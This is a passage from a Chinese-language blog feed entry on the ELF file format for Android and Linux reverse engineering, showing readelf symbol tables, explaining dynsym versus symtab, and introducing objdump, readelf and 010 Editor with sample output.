class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ readelf -s libhello.so</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 7 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     5: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000001109    37 FUNC    GLOBAL DEFAULT   12 main</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 26 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     2: 0000000000001050     0 FUNC    LOCAL  DEFAULT   12 deregister_tm_clones</span><br><span class="line">     3: 0000000000001080     0 FUNC    LOCAL  DEFAULT   12 register_tm_clones</span><br><span class="line">     4: 00000000000010c0     0 FUNC    LOCAL  DEFAULT   12 __do_global_dtors_aux</span><br><span class="line">     5: 0000000000004028     1 OBJECT  LOCAL  DEFAULT   23 completed.0</span><br><span class="line">     6: 0000000000003e18     0 OBJECT  LOCAL  DEFAULT   18 __do_global_dtor[...]</span><br><span class="line">     7: 0000000000001100     0 FUNC    LOCAL  DEFAULT   12 frame_dummy</span><br><span class="line">     8: 0000000000003e10     0 OBJECT  LOCAL  DEFAULT   17 __frame_dummy_in[...]</span><br><span class="line">     9: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hello.c</span><br><span class="line">    10: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">    11: 00000000000020b0     0 OBJECT  LOCAL  DEFAULT   16 __FRAME_END__</span><br><span class="line">    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS </span><br><span class="line">    13: 0000000000001130     0 FUNC    LOCAL  DEFAULT   13 _fini</span><br><span class="line">    14: 0000000000004020     0 OBJECT  LOCAL  DEFAULT   22 __dso_handle</span><br><span class="line">    15: 0000000000003e20     0 OBJECT  LOCAL  DEFAULT   19 _DYNAMIC</span><br><span class="line">    16: 0000000000002010     0 NOTYPE  LOCAL  DEFAULT   15 __GNU_EH_FRAME_HDR</span><br><span class="line">    17: 0000000000004028     0 OBJECT  LOCAL  DEFAULT   22 __TMC_END__</span><br><span class="line">    18: 0000000000004000     0 OBJECT  LOCAL  DEFAULT   21 _GLOBAL_OFFSET_TABLE_</span><br><span class="line">    19: 0000000000001000     0 FUNC    LOCAL  DEFAULT    9 _init</span><br><span class="line">    20: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5</span><br><span class="line">    22: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    23: 0000000000001109    37 FUNC    GLOBAL DEFAULT   12 main</span><br><span class="line">    24: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    25: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br></pre></td></tr></table></figure><p>可以看出符号表有两个，分别为<code>dynsym</code>和<code>symtab</code>，<code>symtab</code>中包含所有在程序中出现的符号以及一些库函数的符号，而<code>dynsym</code>中的符号是<code>symtab</code>中符号的子集，仅仅出现了外部可以看到的符号（比如静态函数<code>mult</code>的符号在<code>dynsym</code>就看不到）。这是因为<code>dynsym</code>中的符号只有在动态链接时也就是运行时才能被解析。</p><h1 id="5-解析ELF文件相关工具"><a href="#5-解析ELF文件相关工具" class="headerlink" title="5. 解析ELF文件相关工具"></a>5. 解析ELF文件相关工具</h1><h2 id="5-1-objdump"><a href="#5-1-objdump" class="headerlink" title="5.1 objdump"></a>5.1 objdump</h2><p>objdump 有点像快速查看之类的工具，就是以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。对于想进一步了解系统的程序员，应该掌握这种工具，至少你可以自己写写shellcode了，或者看看人家给的 exploit 中的 shellcode 是什么东西。</p><p>Windows下使用objdump需要下载<a href="https://developer.android.google.cn/ndk/downloads/index.html">Android NDK</a>，将objdump所在路径添加到环境变量，就可以使用objdump了。Windows下的objdump工具名为llvm-objdump。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">llvm-objdump -S pwn1 &gt; Disassembly.txt//-S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数</span><br><span class="line">llvm-objdump -s pwn1 &gt; Section.txt//-s 显示指定section的完整内容</span><br></pre></td></tr></table></figure><h2 id="5-2-readelf"><a href="#5-2-readelf" class="headerlink" title="5.2 readelf"></a>5.2 readelf</h2><p>用法同4.1</p><p>Windows下的readelf也在Android NDK中，与objdump同一个目录。Windows下的objdump工具名为llvm-readelf。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;llvm-readelf -h pwn1</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x401060</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          14680 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         11</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         29</span><br><span class="line">  Section header string table index: 28</span><br></pre></td></tr></table></figure><h2 id="5-3-010-Editor"><a href="#5-3-010-Editor" class="headerlink" title="5.3 010 Editor"></a>5.3 010 Editor</h2><p>在分析ELF文件格式时就用到了010 Editor，载入ELF模板分析ELF文件事半功倍。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Android是基于Linux开发的，所以了解ELF格式对学习Android逆向和Linux逆向是必不可少的。&lt;/p&gt;
&lt;p&gt;可执行与可链接格式 （Executable and Linkable Format，ELF），常被称为 ELF格式，是一种用于可执行文件、目标代码、共享库和核心转储（core dump）的标准文件格式，一般用于类Unix系统，比如Linux，Macox等。ELF 格式灵活性高、可扩展，并且跨平台。比如它支持不同的字节序和地址范围，所以它不会不兼容某一特别的 CPU 或指令架构。这也使得 ELF 格式能够被运行于众多不同平台的各种操作系统广泛采纳。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
